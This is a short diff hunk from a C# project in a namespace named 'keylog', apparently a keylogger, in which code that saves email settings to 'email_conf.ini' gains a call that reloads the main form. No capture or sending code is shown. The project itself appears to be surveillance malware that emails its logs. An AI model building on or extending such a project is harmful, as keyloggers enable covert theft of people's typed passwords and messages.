@@ -136,7 +136,7 @@ namespace keylog
             using (StreamWriter file = new StreamWriter("email_conf.ini"))
                 foreach (var entry in d)
                     file.WriteLine("{0},{1}", entry.Key, entry.Value);
-
+            mainForm.Instince.mainForm_Load(sender, e);
         }
 
         private void Email_Load(object sender, EventArgs e)
